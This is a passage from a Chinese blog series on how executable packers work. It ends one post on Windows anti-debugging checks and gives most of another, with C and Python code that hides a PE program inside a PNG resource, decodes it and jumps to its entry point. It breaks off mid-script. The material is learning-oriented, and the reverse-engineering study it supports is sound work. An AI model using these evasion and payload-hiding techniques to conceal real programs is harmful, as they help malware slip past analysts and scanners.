&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_SoftwareBreakPoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">PBYTE&lt;/span> &lt;span class="n">addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">addr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0xcc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;SoftwareBreakpoint&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 在主函数里：
&lt;/span>&lt;span class="c1">// anti_debug_by_SoftwareBreakPoint((PBYTE)&amp;amp;load_PE)
&lt;/span>&lt;span class="c1">// 就能检测到在 load_PE 函数开头处下的断点
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果能以一定的方式确定一个函数的代码段大小，也可以做到对整个函数的完整性检测（通过计算 CRC 或者其他哈希算法，甚至就直接累加都行）。&lt;/p>
&lt;p>确定函数代码段大小的方式我只想到一个利用栈上的返回地址=，=在函数开头和结尾部分调用一次获取栈上返回地址的函数就能拿到一个范围了，但感觉并不可靠，主要是编译器优化可能重排代码，而且不走到结尾部分也没法开始计算哈希=，=这都给人调试完了。&lt;/p>
&lt;h2 id="结论">结论&lt;/h2>
&lt;p>所有案例代码都在这里：[github.com/nnnewb/learning-packer](&lt;a class="link" href="https://github.com/nnnewb/learning-packer/tree/main/packer6" target="_blank" rel="noopener"
>learning-packer/packer6 at main · nnnewb/learning-packer (github.com)&lt;/a>)&lt;/p>
&lt;p>总结就是反调试主要靠 &lt;em>判断调试器特征&lt;/em> 来发现正在被调试。而这个判断方法就很多，从硬件到操作系统层面，再到软件层面，都有洞可以钻。&lt;/p>
&lt;p>总结这篇里实践的反调试（或者说检测调试器）方式有这些：&lt;/p>
&lt;ul>
&lt;li>PEB和相关结构的各种标志位&lt;/li>
&lt;li>内核接口，&lt;code>NtQueryInformationProcess&lt;/code>、&lt;code>NtSetInformationThread&lt;/code>等等&lt;/li>
&lt;li>异常处理机制，&lt;code>SEH&lt;/code>，&lt;code>VEH&lt;/code>，触发会被调试器处理的异常（或者只在有调试器时才会触发的异常）来发现调试器&lt;/li>
&lt;li>调试寄存器和硬件断点&lt;/li>
&lt;li>代码完整性校验发现软件断点&lt;/li>
&lt;/ul>
&lt;p>以上就是本篇实验过的所有反调试思路了。原本应该有个通过 TLS 回调隐藏自身的案例，但是 MinGW 加不了 TLS 回调（可能还是我菜），谷歌搜到的做法都是要对编译好的二进制文件打补丁，太麻烦就没搞。&lt;/p>
&lt;p>另外还有个利用执行时间做反调试，因为不知道现在都是怎么利用，然后是这个反调试原理感觉也是很简单=，=就是利用方法可能千奇百怪，单单写两次 time 调用感觉没啥意义就没写（偷懒了）。&lt;/p>
&lt;p>总之就是隐藏好反调试的代码，然后发现调试器就悄悄施展迷惑手段或者干脆大搞破坏。&lt;/p>
&lt;h2 id="参考资料">参考资料&lt;/h2>
&lt;ul>
&lt;li>&lt;a class="link" href="https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software" target="_blank" rel="noopener"
>Anti Debugging Protection Techniques With Examples&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.geoffchappell.com/" target="_blank" rel="noopener"
>Geoff Chappell, Software Analyst&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://ctf-wiki.org/" target="_blank" rel="noopener"
>CTF Wiki&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://book.douban.com/subject/25868289/" target="_blank" rel="noopener"
>《恶意代码分析实战》&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>内容主要来自第一个链接，根据我的环境做了一些修改（比如有些SEH的我实测 x32dbg 不行就换成了VEH），结合参考了 CTF wiki 和 《恶意代码分析实战》这书。API 全是微软的文档和没有文档化的接口我不一个一个摆链接了。&lt;/p></description></item><item><title>加壳原理05：利用图片隐藏</title><link>https://nnnewb.github.io/blog/p/learning-packer-05/</link><pubDate>Thu, 21 Oct 2021 21:17:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/learning-packer-05/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/learning-packer-05/cover.jpg" alt="Featured image of post 加壳原理05：利用图片隐藏" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>完成了简单的压缩壳之后放松下，在52论坛病毒分析区看到过几次把代码隐藏到图片里的做法，也看到过把程序转成图片后训练神经网络来判断有没有恶意的，于是就想，淦，这不是挺好玩的嘛。&lt;/p>
&lt;h2 id="0x01-思路">0x01 思路&lt;/h2>
&lt;p>用图片保存程序最简单的做法就是直接把程序每个字节都转成像素，然后输出成灰度图。比较进阶的做法就像是二维码了，大色块，容错校验，图片被压到包浆也能扫出来。但那个有点点难（我菜）最终成果也大到不现实，而且实话说打包到程序里就不用考虑被二次压缩的情况了。所以简单的8bit灰度图就刑。&lt;/p>
&lt;p>说到位图肯定有人想到了 BMP ，我记得上学那会儿还跟着网上哪儿找的教程，学着用 ffmpeg 把 &lt;em>Bad Apple&lt;/em> 转成位图序列，再转成字符图合并成 HTML，用 js 播放。说起来都是泪。&lt;/p>
&lt;p>现在已经成了正经的码农，再折腾 BMP 就没意思了，PNG 就挺好的。&lt;/p>
&lt;p>图片可以放到 Section 里——但并没有意义，所以我选择放到资源里。写一个 &lt;code>.rc&lt;/code> 文件用 &lt;code>windres&lt;/code> 编译出目标文件，再拿 &lt;code>gcc&lt;/code> 链接就行了。如此一来并没有 lief 出场的机会，编译好的加载器就是加完壳的程序。&lt;/p>
&lt;p>加载器则采用开启 ASLR 的模式，这样程序的节表会比较干净，没有明显特征（虽然也没什么卵用）。&lt;/p>
&lt;h2 id="0x02-加载器">0x02 加载器&lt;/h2>
&lt;h3 id="21-资源介绍">2.1 资源介绍&lt;/h3>
&lt;p>参考微软的文档 &lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/menurc/using-resources" target="_blank" rel="noopener"
>Using Resources&lt;/a>、&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/menurc/resources" target="_blank" rel="noopener"
>Menu and Other Resources&lt;/a>。&lt;/p>
&lt;blockquote>
&lt;p>A &lt;em>resource&lt;/em> is binary data that you can add to the executable file of a Windows-based application. A resource can be either standard or defined. The data in a &lt;em>standard resource&lt;/em> describes an icon, cursor, menu, dialog box, bitmap, enhanced metafile, font, accelerator table, message-table entry, string-table entry, or version information. An &lt;em>application-defined resource&lt;/em>, also called a &lt;em>custom resource&lt;/em>, contains any data required by a specific application.&lt;/p>
&lt;/blockquote>
&lt;p>资源就是一堆打包进可执行文件里的二进制数据，有标准资源类型和自定义的资源类型，标准的回头看就全是微软的历史包袱了，自定义的就是随便什么东西。&lt;/p>
&lt;p>资源本身是有结构的，大体上分三层：&lt;/p>
&lt;ol>
&lt;li>类型；比如图标、对话框、位图、Manifest等等。&lt;/li>
&lt;li>ID；资源的标识符，可以是数字或字符串。&lt;/li>
&lt;li>语言；英语法语等等..&lt;/li>
&lt;/ol>
&lt;p>经过这样三层索引就能找到对应资源的原始数据了。&lt;/p>
&lt;p>如图：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-05/07_resource_tree.png"
width="1080"
height="555"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-05/07_resource_tree_hu7434ebea0cccdf660ca2884c9de14b61_327250_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-05/07_resource_tree_hu7434ebea0cccdf660ca2884c9de14b61_327250_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="07_resource_tree.png"
class="gallery-image"
data-flex-grow="194"
data-flex-basis="467px"
>&lt;/p>
&lt;h3 id="22-查找并加载资源">2.2 查找并加载资源&lt;/h3>
&lt;p>步骤很简单：&lt;/p>
&lt;ol>
&lt;li>&lt;code>FindResource&lt;/code> 找到你要的资源&lt;/li>
&lt;li>&lt;code>SizeofResource&lt;/code> 确定你要的资源大小&lt;/li>
&lt;li>&lt;code>LoadResource&lt;/code> 加载资源，得到 HANDLE&lt;/li>
&lt;li>&lt;code>LockResource&lt;/code> 锁定资源，得到资源首字节指针&lt;/li>
&lt;/ol>
&lt;p>实现比较啰嗦，主要是错误检查很啰嗦。我这返回值都是随便 return 的，更好的做法应该是 &lt;code>GetLastError&lt;/code> 去拿错误码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="nf">get_resource&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">HRSRC&lt;/span> &lt;span class="n">res_found&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FindResourceA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;BEAUTIFUL.PNG&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RT_RCDATA&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">res_found&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;find resource failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;FindResourceA&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">sizeof_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">SizeofResource&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">res_found&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sizeof_res&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;sizeof resource failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;SizeofResource&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">HGLOBAL&lt;/span> &lt;span class="n">res_loaded&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoadResource&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">res_found&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">res_loaded&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;load resource failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;LoadResource&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">LPVOID&lt;/span> &lt;span class="n">res_acquired&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LockResource&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">res_loaded&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">res_acquired&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;lock resource failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;LockResource&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">buffer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sizeof_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sizeof_res&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">res_acquired&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sizeof_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">UnlockResource&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">res_loaded&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">FreeResource&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">res_loaded&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>得到数据后复制到新分配的内存里返回出去就完事了。&lt;/p>
&lt;h3 id="23-解析图片">2.3 解析图片&lt;/h3>
&lt;p>得到了资源图片的内容之后，下一步就是把图片解码成像素，还原到程序本身了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;#34;png.h&amp;#34;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stddef.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdint.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">typedef&lt;/span> &lt;span class="kt">uint8_t&lt;/span> &lt;span class="n">u8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">u8p&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">typedef&lt;/span> &lt;span class="kt">uint32_t&lt;/span> &lt;span class="n">u32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">u32p&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// decode PNG in memory
&lt;/span>&lt;span class="c1">// https://stackoverflow.com/questions/53237065/using-libpng-1-2-to-write-rgb-image-buffer-to-png-buffer-in-memory-causing-segme
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">u8p&lt;/span> &lt;span class="nf">read_program_from_png&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">u8p&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">png_image&lt;/span> &lt;span class="n">image&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="n">image&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">version&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PNG_IMAGE_VERSION&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">png_image_begin_read_from_memory&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">png_bytep&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">image&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">format&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PNG_FORMAT_GRAY&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="n">input_data_length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PNG_IMAGE_SIZE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">buffer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">png_bytep&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_data_length&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">input_data_length&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">png_image_finish_read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">u32&lt;/span> &lt;span class="n">actual_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">u32&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">program&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">actual_len&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">program&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">actual_len&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">u8p&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">program&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>面向 stackoverflow 编程，照着抄一个 libpng 的解码实现。不同的是把解码后的头4个字节作为小端序无符号整型，认为是程序的实际大小。因为程序的大小可能并不正好是图片的像素数量（width*height）。&lt;/p>
&lt;p>最后是把解码后的内容复制到新分配的内存里返回。现在返回的指针应该就指向我们的 PE 文件内容了。&lt;/p>
&lt;h3 id="24-入口点">2.4 入口点&lt;/h3>
&lt;p>在入口点，调用加载资源函数获得资源数据的指针，传给解码的函数，得到解码后的PE文件指针，然后加载并跳转到被加载程序的入口点，就这么简单。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="nf">_start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">buffer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="n">length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">get_resource&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;BEAUTIFUL.PNG&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">u8p&lt;/span> &lt;span class="n">program&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">read_program_from_png&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">u8p&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">program&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">entrypoint&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="n">load_PE&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">program&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">entrypoint&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">program&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;.packed section not found&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;loader error&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x03-加壳机">0x03 加壳机&lt;/h2>
&lt;h3 id="31-程序转图片">3.1 程序转图片&lt;/h3>
&lt;p>使用 &lt;code>pypng&lt;/code> 这个包实现把二进制程序转图片。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">IMG_PATH&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;packer5-packed.png&amp;#39;&lt;/span>
&lt;span class="n">ROW_LEN&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">256&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;example.exe&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;rb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;span class="n">content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;I&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">content&lt;/span>
